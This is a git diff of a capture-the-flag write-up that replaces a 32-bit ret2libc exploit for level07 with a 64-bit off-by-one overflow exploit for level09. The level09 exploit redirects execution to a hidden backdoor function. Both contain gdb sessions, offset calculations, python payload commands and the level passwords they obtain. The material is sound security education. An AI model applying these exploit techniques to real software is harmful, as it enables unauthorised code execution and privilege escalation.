@@ -1,4 +1,4 @@
-# Level07 - 32 bits - Bypass Modulo protection
+# Level09 - 64 bits -
 
 ## Local script usage
 
@@ -17,183 +17,91 @@ You can setup requirements with the script: [scripts/installUtils.sh](../../scri
 
 |         |                                            |
 | ------- | ------------------------------------------ |
-| level07 | `GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8` |
-| level08 | `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC` |
+| level09 | `GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8` |
+| end     | `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE` |
 
 ## Steps to resolve on VM
 
 See our assembly interpretation in [source file](../source.c)
 
-We can notice multiple things:
+We can see a function `secret_backdoor` that is able to execute a given string. But this function is not called. We have to find a way to redirect the code.
 
-- First, the program erases every arguments passed to the program and every environment variables. It means we can not use a shellcode passed in argument or exported as environment variable.
-- We can store unsigned integers in an array and read them, while giving an index.
-- The array has a size of 25 (`25 * 4 bytes`), but there is no protection to write beyond.
-- Nonetheless there is a little protection: we can not write at indexes where `index % 3 == 0`. (It seems that EIPs are aligned, and this is a little protection).
+The function used such as `fgets`, `strncpy` and `printf` are correctly used and not vulnerable.
 
-As we can not execute a shellcode, we will try to use the ret2libc attack while overriding the return address with: `system_address` + `exit_address [optional]` + `/bin/sh`
+But there is still a vulnerability: the function `set_username` fills 41 characters inside `msg.usr` instead 40 characters. As `msg` data are stored in a structure, data are contiguous. It means we are able to override the max length of the message. It is useful, because this length is used by `strncpy`. We are able to create an overflow.
 
-First, we need to find `system`, `exit` and `/bin/sh` addresses
+First lets find the `secret_backdoor` address:
 
 ```shell
-gdb-peda$ b*main
-gdb-peda$ run
-gdb-peda$ p system
-  $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-
-gdb-peda$ p exit
-  $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
-
-gdb-peda$ searchmem "/bin/sh"
-  Searching for '/bin/sh' in: None ranges
-  Found 1 results, display max 1 items:
-  libc : 0xf7f897ec ("/bin/sh")
+info function secret_backdoor
+0x000055555555488c  secret_backdoor
 ```
 
-Perfect ! Now we have to find the return address in the GOT of main function.
-
-```
-gdb-peda$ info frame
-Stack level 0, frame at 0xffffd640:
- eip = 0x8048723 in main; saved eip 0xf7e45513
- called by frame at 0xffffd6b0
- Arglist at unknown address.
- Locals at unknown address, Previous frame's sp is 0xffffd640
- Saved registers:
-  eip at 0xffffd63c
-```
-
-We have everything we need to build exploit.
-
-To summurize, we want write this payload at EIP address:
-
-```
-EIP_ADDRESS = SYSTEM_ADDRESS + EXIT_ADDRESS + SHELL_ADDRESS
-                    |              |               |
-0xffffd63c =   0xf7e6aed0      0xf7e5eb70      0xf7f897ec
-```
-
-Now, we have to store this payload at EIP address using `store_number`. So we need to find the indexes of EIP address regarding our array.
-
-Lets get the array address.
+Then, lets find the EIP address of the return of `handle_msg`
 
 ```shell
-b*store_number+6
+b*handle_msg+80 # before set_username
 run
-(stdin) store
-p $ebp+0x8 # int *data
-  $9 = (void *) 0xffffd450
-x/a 0xffffd450
-0xffffd450:     0xffffd474  # <-- data[0]
+info frame
+  Stack level 0, frame at 0x7fffffffe4e0: (...)
+  rip at 0x7fffffffe4d8    # handle_msg return eip
 ```
 
-Now we have to calculate the offset of EIP address:
+And now, lets find the `msg` address, and calculate the offset with the EIP found
 
 ```shell
-p /d (int)(0xffffd63c - 0xffffd474) # eip_address - array_address
-  456 # bytes
-p /d 456 / 4
-  114 # index
+p $rbp-0xc0 # t_msg msg
+  $1 = (void *) 0x7fffffffe410
 
-p 114 % 3
-  0x0
+p /d 0x7fffffffe4d8 - 0x7fffffffe410 # eip - msg
+  $3 = 200 # offset
 ```
 
-But as `114 % 3 == 0`, we can not write enter this number as index.
+The offset is 200.
 
-We had to find a way to bypass this protection.
+Our exploit will be something like:
 
-As `index` is an unsigned int, and as `index` is multiplied by 4, before storing the number, what happens if we use a number greater than `UINT_MAX + 1 / 4` ?
-
-```shell
-p (unsigned int)0x100000000 # UINT_MAX + 1
-  0x0                       # stores at index 0
-
-p /u (0x100000000 / 4) + 114
-  1073741938                # stores at index 114
-
-p 1073741938 % 3
-  0x1                       # and it passes the check !
+```
+USERNAME_INPUT: 'A' * 40 + (OFFSET + 8) # 8 bytes to write the x64 address
+MESSAGE_INPUT:  'B' * OFFSET + SECRET_BACKDOOR_ADDRESS
+BACKDOOR_INPUT: '/bin/sh'
 ```
 
-Lets check with a simple value
+Lets calculate the offset + 8 bytes in hexadecimal
 
 ```shell
-p /d 0x41414141
-  1094795585 # AAAA
-
-run
-  Input command: store
-    Number: 1094795585      # AAAA
-    Index: 1073741938       # index 114
-    Completed store command successfully
-  Input command: quit
-
-EIP: 0x41414141 ('AAAA')
-Stopped reason: SIGSEGV
-0x41414141 in ?? ()
+p 200 + 8
+  $2 = 0xd0
 ```
 
-It segfaults while quiting the program. It is exactly what we wanted.
-
-Lets build our exploit with `system`, `exit` and `/bin/sh`
+Perfect, we have everything we need
 
 ```shell
-Index 114: 1073741938 stores at index 114 (cf. above)
-Index 115: 115 % 3 = 1 => we can use 115 as index
-Index 116: 116 % 3 = 2 => we can use 116 as index
+python -c "print 'A' * 40 + '\xd0'" > /tmp/exploit09
+python -c "print 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" >> /tmp/exploit09
+echo "/bin/sh" >> /tmp/exploit09
 
+~/level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Msg @Unix-Dude
+>>: >: Msg sent!
 
-EIP_ADDRESS = SYSTEM_ADDRESS + EXIT_ADDRESS + SHELL_ADDRESS
-                    |              |               |
-0xffffd63c =   0xf7e6aed0      0xf7e5eb70      0xf7f897ec    # Addresses
-               4159090384      4159040368      4160264172    # Unsigned int
-                    |              |               |
-               data[114]       data[115]       data[116]
-               1073741938      115             116           # Indexes
-```
-
-Let try to get the shell:
-
-```shell
-~/level07
-  Input command: store
-    Number: 4159090384  # system 0xf7e6aed0
-    Index: 1073741938   # Index 114
-    Completed store command successfully
-  Input command: store
-    Number: 4159040368  # exit 0xf7e5eb70
-    Index: 115
-    Completed store command successfully
-  Input command: store
-    Number: 4160264172  # /bin/sh 0xf7f897ec
-    Index: 116
-    Completed store command successfully
-  Input command: quit
 $ whoami
-  level08
-$ cat /home/users/level08/.pass
-  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+  end
+$ cat /home/users/end/.pass
+  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
 
 ## Sources
 
-### Hack
-
-- [FR - Retour à la libc](https://beta.hackndo.com/retour-a-la-libc/)
-
-### Debugger
-
-- [get return address GDB](https://stackoverflow.com/questions/32345320/get-return-address-gdb)
-
 ### C
 
-- [Man fflush](https://linux.die.net/man/3/fflush)
 - [Man fgets](https://linux.die.net/man/3/fgets)
-- [Man getchar](https://linux.die.net/man/3/getchar)
 - [Man memset](https://linux.die.net/man/3/memset)
 - [Man printf](https://linux.die.net/man/3/printf)
 - [Man puts](https://linux.die.net/man/3/puts)
-- [Man scanf](https://linux.die.net/man/3/scanf)
-- [Man strlen](https://linux.die.net/man/3/strlen)
-- [Man strncmp](https://linux.die.net/man/3/strncmp)
+- [Man strncpy](https://linux.die.net/man/3/strncpy)
+- [Man system](https://linux.die.net/man/3/system)
